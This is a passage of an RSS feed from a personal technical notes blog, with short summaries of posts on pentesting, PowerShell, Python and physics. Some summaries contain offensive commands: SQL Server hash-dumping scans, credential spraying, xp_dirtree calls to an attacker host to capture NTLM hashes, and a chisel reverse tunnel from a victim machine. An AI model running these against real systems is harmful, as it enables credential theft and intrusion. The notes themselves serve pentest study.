      <description>gRPC gRPC (short for Google Remote Procedure Call) is a modern open-source framework developed by Google for creating high-performance, language-agnostic remote procedure call (RPC) systems. It enables communication and interaction between different applications or services running on different platforms and written in different programming languages.&#xA;On Linux, gRPC provides a mechanism for building distributed systems by allowing services to communicate with each other efficiently and securely over a network. It utilizes HTTP/2 protocol as its transport layer and supports different serialization formats like Protocol Buffers (protobuf) for efficient data exchange.</description>
    </item>
    <item>
      <title>Pentest - IP Camera</title>
      <link>https://kdbed.github.io/posts/pentest_ip_camera/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_ip_camera/</guid>
      <description>Hacking IP Cameras cameradar</description>
    </item>
    <item>
      <title>Pentest - MSSQL - Microsoft SQL Server p 1433</title>
      <link>https://kdbed.github.io/posts/pentesting_mssql_microsoft_sql_server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentesting_mssql_microsoft_sql_server/</guid>
      <description>Pentest Microsoft SQL Server Enumeration 1 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &amp;lt;IP&amp;gt; Test credentials 1 crackmapexec mssql &amp;lt;host&amp;gt; -u users.txt -p passwords.txt Establish connection impacket-mssqlclient -dc-ip &amp;lt;ip&amp;gt; -windows-auth domain/username:password@host List DBs 1 SELECT name FROM master..sysdatabases; Check permissions 1 2 3 4 Use master; EXEC sp_helprotect &amp;#39;xp_dirtree&amp;#39;; EXEC sp_helprotect &amp;#39;xp_subdirs&amp;#39;; EXEC sp_helprotect &amp;#39;xp_fileexist&amp;#39;; xp_dirtree 1 EXEC xp_dirtree &amp;#39;C:\inetpub\wwwroot&amp;#39;, 1, 1; Use xp_dirtree to obtain NTLM hashes&#xA;1 2 3 4 #victim xp_dirtree \\&amp;lt;attacker_ip&amp;gt;\file.</description>
    </item>
    <item>
      <title>Pentest - Passive Information Gathering</title>
      <link>https://kdbed.github.io/posts/pentest_passive_information_gathering/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_passive_information_gathering/</guid>
      <description>Passive Information Gathering Also known as open-source intelligence OSINT &amp;ndash; the process of collecting freely-available information about a target, often with no direct interaction/contact with target assets. In a strict interpretation, there&amp;rsquo;s zero interaction with the target, eg all information is obtained through a third party. More loosely, passive information gathering allows for interaction with the target, but only as a normal user, eg registering for an account on the corporate website.</description>
    </item>
    <item>
      <title>Pentest - Password Cracking</title>
      <link>https://kdbed.github.io/posts/pentest_password_cracking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_password_cracking/</guid>
      <description>Password Cracking Hashcat Sample bash script to derive a wordlist from a known base word:&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #!/bin/bash # Starting word (krakencorp) base_word=&amp;#34;krakencorp&amp;#34; # Output file to save the generated passwords output_file=&amp;#34;crackedpasswords.txt&amp;#34; # Clear the output file if it exists &amp;gt; &amp;#34;$output_file&amp;#34; # Loop over all the rules in /usr/share/hashcat/rules/ for rule in /usr/share/hashcat/rules/*.rule; do # Apply each rule and append the result to crackedpasswords.</description>
    </item>
    <item>
      <title>Pentest - Phishing</title>
      <link>https://kdbed.github.io/posts/pentest_phishing/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_phishing/</guid>
      <description>Phishing Evilginx: https://evilginx.com/ zscaler</description>
    </item>
    <item>
      <title>Pentest - Python</title>
      <link>https://kdbed.github.io/posts/pentest_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_python/</guid>
      <description>Vulnerability in str.format() in Python https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/</description>
    </item>
    <item>
      <title>Pentest - SMB p 139,445</title>
      <link>https://kdbed.github.io/posts/pentest_smb_p_139_445/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_smb_p_139_445/</guid>
      <description>HackTricks&#xA;Port 139 NetBIOS NetBIOS is Network Basic Input Output System, which is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network.&#xA;Port 445 SMB - Server Message Block While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’.&#xA;SMB Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network.</description>
    </item>
    <item>
      <title>Pentest - SQL</title>
      <link>https://kdbed.github.io/posts/pentest_sql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_sql/</guid>
      <description>MySQL mysql -u fooUser -p -h 44.55.66.77&#xA;MSSQL impacket-mssqlclient -port 1433 domain/user:password@host&#xA;capture NTLM hashes: SQL&amp;gt; exec master.sys.xp_dirtree &amp;quot;\\10.10.16.2\test&amp;quot;</description>
    </item>
    <item>
      <title>Pentest - SSH p 22</title>
      <link>https://kdbed.github.io/posts/pentest_ssh/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_ssh/</guid>
      <description>Pentesting SSH ssh-audit Install&#xA;sudo apt install ssh-audit </description>
    </item>
    <item>
      <title>Pentest - Stealing Chrome Cookies</title>
      <link>https://kdbed.github.io/posts/pentest_stealing_chrome_cookies/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_stealing_chrome_cookies/</guid>
      <description>Stealing Chrome Cookies source: mango.pdf.zone&#xA;Using Chrome&amp;rsquo;s remote debugging protocol to steal cookies. github - defaultnamehere&#xA;requires rce on victim&amp;rsquo;s machine Defense CyberArk&#xA;Infostealers, Token Theft, Azure https://www.varonis.com/blog/cookie-bite&#xA;Chrome Forensics hindsight</description>
    </item>
    <item>
      <title>Pentest - Symbolic Links</title>
      <link>https://kdbed.github.io/posts/pentest_symbolic_links/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_symbolic_links/</guid>
      <description>Symbolic Links Windows The C: directory isn&amp;rsquo;t a real directory on disk, but a symbolic link object in the Windows Kernel - Object Manager namespace, which is isolated from the regular file system. The symbolic link holds the value of the physical path on the file system, the real device. The kernel calls ObpParseSymbolicLink to resolve the symlink.&#xA;A regular user is limited in the creation and deletion of symlinks in the object manager.</description>
    </item>
    <item>
      <title>Pentest - Windows Privilege Escalation</title>
      <link>https://kdbed.github.io/posts/pentest_windows_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pentest_windows_privilege_escalation/</guid>
      <description>From Service to SYSTEM Service Account Privileges Services can be run such that they don&amp;rsquo;t maintain the privs of NT AUTHORITY\LOCAL SERVICE account, eg with the -k LocalServiceAndNoImpersonation option.&#xA;The task scheduler can be used to restore default privs: FullPowers itm4n. After executing FullPowers:</description>
    </item>
    <item>
      <title>philosophy</title>
      <link>https://kdbed.github.io/posts/philosophy/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/philosophy/</guid>
      <description></description>
    </item>
    <item>
      <title>Physics</title>
      <link>https://kdbed.github.io/posts/physics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/physics/</guid>
      <description></description>
    </item>
    <item>
      <title>PIE</title>
      <link>https://kdbed.github.io/posts/pie/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/pie/</guid>
      <description>Binary Analysis</description>
    </item>
    <item>
      <title>Political Science</title>
      <link>https://kdbed.github.io/posts/political_science/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/political_science/</guid>
      <description>philosophy</description>
    </item>
    <item>
      <title>politics</title>
      <link>https://kdbed.github.io/posts/politics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/politics/</guid>
      <description></description>
    </item>
    <item>
      <title>Port Forwarding</title>
      <link>https://kdbed.github.io/posts/port_forwarding/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/port_forwarding/</guid>
      <description>Port Forwarding Chisel Compromised windows machine &amp;ndash; service hosted only at 127.0.0.1 &amp;ndash; attacker machine is server and victim machine is client:&#xA;1 2 3 4 # attacker chisel server --socks5 --reverse -p 1234 # windows victim chiselx86_64.exe client &amp;lt;attacker ip&amp;gt;:1234 R:9090:127.0.0.1:9090 Sources twelvesec </description>
    </item>
    <item>
      <title>powershell</title>
      <link>https://kdbed.github.io/posts/powershell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell/</guid>
      <description></description>
    </item>
    <item>
      <title>PowerShell - Add a calculated property in Select-Object</title>
      <link>https://kdbed.github.io/posts/powershell_add_a_calculated_property_in_select_object/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_add_a_calculated_property_in_select_object/</guid>
      <description>Calculated Property in Select-Object The proper syntax for forming the hash table:&#xA;1 Get-Service | Select-Object -Property @{Name = &amp;#39;Name&amp;#39;; Expression = {$_.Name}} </description>
    </item>
    <item>
      <title>PowerShell - Check Windows Server TLS Settings</title>
      <link>https://kdbed.github.io/posts/powershell_check_windows_server_tls_settings/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_check_windows_server_tls_settings/</guid>
      <description>Script to check TLS registry settings 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 Function Get-RegValue { [CmdletBinding()] Param ( # Registry Path [Parameter(Mandatory = $true, Position = 0)] [string] $RegPath, # Registry Name [Parameter(Mandatory = $true, Position = 1)] [string] $RegName ) $regItem = Get-ItemProperty -Path $RegPath -Name $RegName -ErrorAction Ignore $output = &amp;#34;&amp;#34; | select Path, Name, Value $output.</description>
    </item>
    <item>
      <title>PowerShell - Classes</title>
      <link>https://kdbed.github.io/posts/powershell_classes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_classes/</guid>
      <description>powershell - Classes Introduction PowerShell is an object-oriented language. When you run commands, see the output on your screen, those are objects.&#xA;Skeleton of a class called student:&#xA;class student { } Classes have properties that look like parameters that are attributes that describe that class. The example below shows a class called student with two properties; FirstName and LastName.&#xA;When you define a property, you should always define a type that sets a specific schema for what property values can hold.</description>
    </item>
    <item>
      <title>PowerShell - Clipboard to Array</title>
      <link>https://kdbed.github.io/posts/powershell_clipboard_to_array/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_clipboard_to_array/</guid>
      <description>(Get-Clipboard) -split &amp;#39;\t|\r?\n&amp;#39; </description>
    </item>
    <item>
      <title>PowerShell - Common Members of two groups</title>
      <link>https://kdbed.github.io/posts/powershell_common_members_of_two_groups/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_common_members_of_two_groups/</guid>
      <description>Get members in common for 2 groups in AD Function Get-ADGroupMembersInBothGroups { Param ( [Parameter(Mandatory=$true)] [string]$Group1, [Parameter(Mandatory=$true)] [string]$Group2 ) $Group1Members = Get-ADGroup -Identity $Group1 -properties members |select -expand members $Group2Members = Get-ADGroup -Identity $Group2 -properties members|select -expand members $match = $Group1Members | Where-Object {$Group2Members -contains $_} write-host $match } </description>
    </item>
    <item>
      <title>PowerShell - Convert from Unix Time</title>
      <link>https://kdbed.github.io/posts/powershell_convert_from_unix_time/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_convert_from_unix_time/</guid>
      <description>Function to convert from Unix timestamps 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 function ConvertFrom-UnixTime { [CmdletBinding(DefaultParameterSetName = &amp;#34;Seconds&amp;#34;)] param ( [Parameter(Position = 0, ValueFromPipeline = $true, Mandatory = $true, ParameterSetName = &amp;#34;Seconds&amp;#34;)] [int] $Seconds, [Parameter(Position = 0, ValueFromPipeline = $true, Mandatory = $true, ParameterSetName = &amp;#34;Miliseconds&amp;#34;)] [bigint] $Miliseconds ) Begin { $date = (Get-Date &amp;#34;1970-01-01 00:00:00.</description>
    </item>
    <item>
      <title>PowerShell - Custom Execution Timer</title>
      <link>https://kdbed.github.io/posts/powershell_custom_execution_timer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_custom_execution_timer/</guid>
      <description>Custom Execution Timer source: devblogs&#xA;function Measure-CommandEx { [CmdletBinding()] param ( [Parameter(Mandatory, Position = 0)] [scriptblock]$Expression, [Parameter(ValueFromPipeline)] [psobject[]]$InputObject ) Begin { $stopWatch = New-Object -TypeName &amp;#39;System.Diagnostics.Stopwatch&amp;#39; &amp;lt;# We need to define result as a list because the way objects are passed to the pipeline. If you pass a collection of objects, the pipeline sends them one by one, and the result is always overridden by the last item. #&amp;gt; [System.Collections.Generic.List[PSObject]]$result = @() } Process { if ($InputObject) { # Starting the stopwatch.</description>
    </item>
    <item>
      <title>PowerShell - Get Domain Controllers in Forest</title>
      <link>https://kdbed.github.io/posts/powershell_get_domain_controllers_in_forest/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_get_domain_controllers_in_forest/</guid>
      <description>To list all of the domain controllers in an Active Directory forest:&#xA;(Get-ADForest).Domains | %{ Get-ADDomainController -Filter * -Server $_ }| Format-Table -Property Name,ComputerObjectDN,Domain,Forest,IPv4Address,OperatingSystem,OperatingSystemVersion </description>
    </item>
    <item>
      <title>PowerShell - Lengh limits AD attributes</title>
      <link>https://kdbed.github.io/posts/powershell_lengh_limits_ad_attributes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_lengh_limits_ad_attributes/</guid>
      <description>Determine character limits on AD attributes 1 2 dsquery * cn=Schema,cn=Configuration,dc=contoso,dc=com -filter &amp;#34;(LDAPDisplayName=department)&amp;#34; -attr rangeUpper dsquery * cn=Schema,cn=Configuration,dc=contoso,dc=com -filter &amp;#34;(LDAPDisplayName=department)&amp;#34; -attr rangeUpper </description>
    </item>
    <item>
      <title>PowerShell - Log Function</title>
      <link>https://kdbed.github.io/posts/powershell_log_function/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_log_function/</guid>
      <description>Log Function for powershell function Write-Log { [CmdletBinding()] param( [Parameter()] [ValidateNotNullOrEmpty()] [string]$Message, [Parameter()] [ValidateNotNullOrEmpty()] [ValidateSet(&amp;#39;Information&amp;#39;,&amp;#39;Warning&amp;#39;,&amp;#39;Error&amp;#39;)] [string]$Severity = &amp;#39;Information&amp;#39; ) [pscustomobject]@{ Time = (Get-Date -f g) Message = $Message Severity = $Severity } | Export-Csv -Path &amp;#34;$env:Temp\LogFile.csv&amp;#34; -Append -NoTypeInformation } From : ATA</description>
    </item>
    <item>
      <title>PowerShell - Monitor Memory</title>
      <link>https://kdbed.github.io/posts/powershell_monitor_memory/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_monitor_memory/</guid>
      <description>Monitor memory with PowerShell 1 2 3 4 5 6 7 8 $totalRam = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum while($true) { $date = Get-Date -Format &amp;#34;yyyy-MM-dd HH:mm:ss&amp;#34; $cpuTime = (Get-Counter &amp;#39;\Processor(_Total)\% Processor Time&amp;#39;).CounterSamples.CookedValue $availMem = (Get-Counter &amp;#39;\Memory\Available MBytes&amp;#39;).CounterSamples.CookedValue $date + &amp;#39; &amp;gt; CPU: &amp;#39; + $cpuTime.ToString(&amp;#34;#,0.000&amp;#34;) + &amp;#39;%, Avail. Mem.: &amp;#39; + $availMem.ToString(&amp;#34;N0&amp;#34;) + &amp;#39;MB (&amp;#39; + (104857600 * $availMem / $totalRam).ToString(&amp;#34;#,0.0&amp;#34;) + &amp;#39;%)&amp;#39; Start-Sleep -s 2 } </description>
    </item>
    <item>
      <title>PowerShell - Regex - string between two strings</title>
      <link>https://kdbed.github.io/posts/powershell_regex_string_between_two_strings/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_regex_string_between_two_strings/</guid>
      <description>Regex - string between two strings 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function GetStringBetweenTwoStrings($firstString, $secondString, $importPath){ #Get content from file $file = gc -raw $importPath #Regex pattern to compare two strings $pattern = &amp;#39;$firstString(.*?)$secondString&amp;#39; #Perform the opperation $result = [regex]::Match($file,$pattern).Groups.Value #Return result write-host $result } </description>
    </item>
    <item>
      <title>PowerShell - Rust</title>
      <link>https://kdbed.github.io/posts/powershell_rust/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_rust/</guid>
      <description>Basic Rust Integration with powershell $rustPgm = @&amp;#34; #[no_mangle] pub extern &amp;#34;C&amp;#34; fn add_numbers(number1: i32, number2: i32) -&amp;gt; i32 { number1 + number2 } &amp;#34;@ $rustPgm | Set-Content -Encoding UTF8 .\lib.rs rustc .\lib.rs --crate-type dylib --crate-name powershell_to_rust ## start another PS so dll doesn&amp;#39;t get locked powershell -command { $definition = @&amp;#34; [DllImport(&amp;#34;powershell_to_rust.dll&amp;#34;)] public static extern Int32 add_numbers(Int32 number1, Int32 number2); &amp;#34;@ $target = Add-Type -MemberDefinition $definition -Name AddNum -PassThru $ans = $target::add_numbers(3, 8) write-host $ans } </description>
    </item>
    <item>
      <title>PowerShell - Script Encryption</title>
      <link>https://kdbed.github.io/posts/powershell_script_encryption/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_script_encryption/</guid>
      <description>Encrypt powershell Scripts Function to obfuscate code containing sensitive data:&#xA;function Encrypt-Script($path, $destination) { $script = Get-Content $path | Out-String $secure = ConvertTo-SecureString $script -asPlainText -force $export = $secure | ConvertFrom-SecureString Set-Content $destination $export &amp;#34;Script &amp;#39;$path&amp;#39; has been encrypted as &amp;#39;$destination&amp;#39;&amp;#34; } function Execute-EncryptedScript($path) { trap { &amp;#34;Decryption failed&amp;#34;; break } $raw = Get-Content $path $secure = ConvertTo-SecureString $raw $helper = New-Object system.Management.Automation.PSCredential(&amp;#34;test&amp;#34;, $secure) $plain = $helper.GetNetworkCredential().Password Invoke-Expression $plain } From: idera</description>
    </item>
    <item>
      <title>PowerShell - Search-ADAccount</title>
      <link>https://kdbed.github.io/posts/powershell_search_adaccount/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_search_adaccount/</guid>
      <description>Search-ADAccount shellgeek</description>
    </item>
    <item>
      <title>PowerShell - Splatting</title>
      <link>https://kdbed.github.io/posts/powershell_splatting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_splatting/</guid>
      <description>Splatting in powershell Splatting allows one to format and send arguments to cmdlets and functions. Typically use dash+parameter name+argument&#xA;Copy-Item -Path &amp;#34;Testfile.txt&amp;#34; -Destination &amp;#34;CopiedFile.txt&amp;#34; -WhatIf -force -Recurse Copy-Item ` -Path &amp;#34;Testfile.txt&amp;#34; ` -Destination &amp;#34;CopiedFile.txt&amp;#34; ` -WhatIf ` -force ` Instead you can splat a parameter set. First create a hashtable containing key/value pairs of each parameter and parameter argument. Then pass that set of parameters to the command with @&amp;lt;hashtablename&amp;gt;</description>
    </item>
    <item>
      <title>PowerShell - Test Credentials</title>
      <link>https://kdbed.github.io/posts/powershell_test_credentials/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_test_credentials/</guid>
      <description>Testing credentials 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 function Test-Cred { [CmdletBinding()] [OutputType([String])] Param ( [Parameter( Mandatory = $false, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true )] [Alias( &amp;#39;PSCredential&amp;#39; )] [ValidateNotNull()] [System.</description>
    </item>
    <item>
      <title>PowerShell - Writing cmdlets in C#</title>
      <link>https://kdbed.github.io/posts/powershell_writing_cmdlets_in_c/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/powershell_writing_cmdlets_in_c/</guid>
      <description>Writing powershell cmdlets in C# source: dotnetninja&#xA;Overview create a new class that derives from one of two base classes (Cmdlet or PsCmdlet), add properties to the class to accept your parameters, override one or more methods in the base class to provide your functionality, and decorate the class and properties with a few attributes.&#xA;cmdlet name all defined in constants in the C# reference library&#xA;VerbsCommon: Add, Clear, Close, Copy, Enter, Exit, Find, Format, Get, Hide, Join, Lock, Move, New, Open, Optimize, Pop, Push, Redo, Remove, Rename, Reset, Resize, Search, Select, Set, Show, Skip, Split, Step, Switch, Undo, Unlock, Watch</description>
    </item>
    <item>
      <title>Python - Data Structures and Algorithms</title>
      <link>https://kdbed.github.io/posts/python_data_structures_and_algorithms/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/python_data_structures_and_algorithms/</guid>
      <description>Python - Data Structures and Algorithms </description>
    </item>
    <item>
      <title>Python - Functional Programming</title>
      <link>https://kdbed.github.io/posts/python_functional_programming/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/python_functional_programming/</guid>
      <description>Functions as parameters Write a simple function that takes a function as a parameter:&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def inch2cm(x): return x*2.54 def convert(f,x): y = f(x) print(x,&amp;#34;=&amp;gt;&amp;#34;,y) convert(inch2cm, 3) # a function to convert celsius to fahrenheit def c2f(x): return x*1.8 + 32 convert(c2f,18) # convert integers to text def i2text(x): text = [&amp;#39;zero&amp;#39;,&amp;#39;one&amp;#39;,&amp;#39;two&amp;#39;,&amp;#39;three&amp;#39;] return text[x] convert(i2text,2) The sorted function The built in sorted function will order numbers or alphabetize strings.</description>
    </item>
    <item>
      <title>Python - List Comprehensions</title>
      <link>https://kdbed.github.io/posts/python_list_comprehensions/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/python_list_comprehensions/</guid>
      <description>Python - List Comprehensions List comprehensions are a compact way of defining a list by looping through another list or other data structure. Let&amp;rsquo;s say we want to double every element in a list. Without list comprehensions:&#xA;sample_list = [4, 5, 6, 7] new_list = [] for i in range(len(sample_list)): new_list.append(sample_list[i]*2) print(new_list) [8, 10, 12, 14] A simplified way to do this:&#xA;newer_list = [2*num for num in sample_list] print(newer_list) [8, 10, 12, 14] List Comprehensions on lists of strings sample_strings = [&amp;#34;python&amp;#34;, &amp;#34;is&amp;#34;, &amp;#34;awesome!</description>
    </item>
    <item>
      <title>Python - Visualize Active Directory Data</title>
      <link>https://kdbed.github.io/posts/python_visualize_active_directory_data/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/python_visualize_active_directory_data/</guid>
      <description>Pandas to plot AD Data 1 2 3 4 5 6 7 8 9 import pandas import matplotlib.pyplot as plt from sqlalchemy import create_engin engine = create_engine(&amp;#34;activedirectory:///?User=cn=Bob F,ou=Employees,dc=Domain&amp;amp;Password=bob123&amp;amp;Server=10.0.1.2&amp;amp;Port=389&amp;#34;) df = pandas.read_sql(&amp;#34;SELECT Id, LogonCount FROM User WHERE CN = &amp;#39;Administrator&amp;#39;&amp;#34;, engine) df.plot(kind=&amp;#34;bar&amp;#34;, x=&amp;#34;Id&amp;#34;, y=&amp;#34;LogonCount&amp;#34;) plt.show() From: cdata.com</description>
    </item>
    <item>
      <title>Quantum Mechanics</title>
      <link>https://kdbed.github.io/posts/quantum_mechanics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/quantum_mechanics/</guid>
      <description>Quantum Mechanics - Basic Principles In quantum mechanics the state of a system is represented by a vector in a complex vector space with Hermitian inner product - the state space. Observable quantities are self-adjoint linear operators on the state space.&#xA;In classical physics, the state of a system is given by a point in a phase space, or equivalently as the space of solutions of an equation of motion. Observable quantities are functions (of coordinates and momenta) on this space.</description>
    </item>
    <item>
      <title>Quotes and Notes</title>
      <link>https://kdbed.github.io/posts/quotes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/quotes/</guid>
      <description>Quotes and Notes 1 - Marx You would be wrong if you thought that I love books. I am a machine condemned to devour them in order to vomit them up in a new form, like manure on the soil of history.&#xA;— Marx in a letter to his daughter Laura, 1868&#xA;2 &amp;ldquo;Meet these two here,&amp;rdquo; the man said. &amp;ldquo;Ask them if they&amp;rsquo;ve got a Mississippi credit card.&amp;rdquo;&#xA;&amp;ldquo;Oh, I know that one,&amp;rdquo; Ruthie explaimed cheerfully.</description>
    </item>
    <item>
      <title>Recon - AutoRecon</title>
      <link>https://kdbed.github.io/posts/recon_autorecon/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/recon_autorecon/</guid>
      <description>AutoRecon https://github.com/Tib3rius/AutoRecon</description>
    </item>
    <item>
      <title>Recon - Port Scanning and Nmap</title>
      <link>https://kdbed.github.io/posts/recon_port_scanning_and_nmap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/recon_port_scanning_and_nmap/</guid>
      <description>Nmap scanning SYN (stealth) scan TCP handshake not completed (ACK not sent)&#xA;1 nmap -sS &amp;lt;ip&amp;gt; Because the three-way handshake is never completed, the information is not passed to the application layer and as a result, will not appear in any application logs. A SYN scan is also faster and more efficient because fewer packets are sent and received.&#xA;TCP Connect Scan 1 nmap -sT &amp;lt;ip&amp;gt; TCP SYN Scan and UDP Scan 1 nmap -sU -sS 192.</description>
    </item>
    <item>
      <title>RELRO</title>
      <link>https://kdbed.github.io/posts/relro/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/relro/</guid>
      <description>https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro</description>
    </item>
    <item>
      <title>Renormalization Group</title>
      <link>https://kdbed.github.io/posts/renormalization_group/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/renormalization_group/</guid>
      <description></description>
    </item>
    <item>
      <title>Reverse Shell - Upgrade TTY</title>
      <link>https://kdbed.github.io/posts/reverse_shell_upgrade_tty/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/reverse_shell_upgrade_tty/</guid>
      <description>Reverse Shells then&#xA;when python isn&amp;rsquo;t available.&#xA;rev shell without python</description>
    </item>
    <item>
      <title>Reversing - Java</title>
      <link>https://kdbed.github.io/posts/reversing_java/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/reversing_java/</guid>
      <description>JAR Decompiler JD-GUI</description>
    </item>
    <item>
      <title>Reversing - Python</title>
      <link>https://kdbed.github.io/posts/reversing_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://kdbed.github.io/posts/reversing_python/</guid>
      <description>Unpacking Python Executables fortinet&#xA;extraction pyinstxtractor - extract the contents of a PyInstaller generated executable file&#xA;decompile pycdc</description>
    </item>
    <item>
      <title>Rubeus</title>
      <link>https://kdbed.github.io/posts/rubeus/</link>
